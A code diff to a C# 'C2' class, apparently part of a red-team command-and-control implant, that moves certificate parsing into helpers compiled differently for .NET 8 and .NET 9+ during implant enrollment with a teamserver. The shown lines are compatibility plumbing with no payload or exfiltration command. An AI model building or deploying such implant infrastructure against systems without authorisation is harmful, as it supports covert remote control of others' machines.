@@ -280,8 +280,10 @@ internal static class C2
         if (string.IsNullOrEmpty(implantId) || string.IsNullOrEmpty(engagementId))
             throw new EnrollRejectedException("enroll OK but missing identity");
         // .NET 10 obsoleted the X509Certificate2(byte[]) ctor (SYSLIB0057); the
-        // loader is the supported path for parsing a DER cert.
-        var leaf = X509CertificateLoader.LoadCertificate(leafDer);
+        // loader is the supported path for parsing a DER cert. The net8.0 dll
+        // bundle compiles the ctor shape instead (the loader ships with
+        // .NET 9) -- the two helpers below keep these sites TFM-neutral.
+        var leaf = LoadCert(leafDer);
         // Pair the issued leaf with the implant's own private key (the teamserver
         // signed over the public half; the private half never left the implant).
         var paired = leaf.CopyWithPrivateKey(privateKey);
@@ -291,12 +293,11 @@ internal static class C2
         // fails every mTLS handshake with "credentials not recognized". The PFX
         // import leaves the pair in the store-shaped form every platform's TLS
         // stack accepts; Linux behavior is unchanged.
-        paired = X509CertificateLoader.LoadPkcs12(
-            paired.Export(X509ContentType.Pfx), null);
+        paired = LoadPfx(paired.Export(X509ContentType.Pfx), null);
 
         var cas = new List<X509Certificate2>();
         foreach (var der in caChain)
-            cas.Add(X509CertificateLoader.LoadCertificate(der));
+            cas.Add(LoadCert(der));
 
         return new Enrollment
         {
@@ -314,6 +315,24 @@ internal static class C2
     /// malformed response): retrying would not change the answer.
     /// </summary>
     internal sealed class EnrollRejectedException(string message) : Exception(message);
+
+    // The two cert parse seams: the X509CertificateLoader API the current
+    // runtimes support (the ctors grew SYSLIB0057) on .NET 9+, and the plain
+    // ctors the net8.0 dll bundle compiles (the loader ships with .NET 9;
+    // the ctor is not obsoleted on net8).
+#if NET9_0_OR_GREATER
+    private static X509Certificate2 LoadCert(byte[] der)
+        => X509CertificateLoader.LoadCertificate(der);
+
+    private static X509Certificate2 LoadPfx(byte[] pfx, string? password)
+        => X509CertificateLoader.LoadPkcs12(pfx, password);
+#else
+    private static X509Certificate2 LoadCert(byte[] der)
+        => new(der);
+
+    private static X509Certificate2 LoadPfx(byte[] pfx, string? password)
+        => new(pfx, password);
+#endif
 
     /// <summary>
     /// The AES-GCM envelope's client half: the same sealed-body shape every
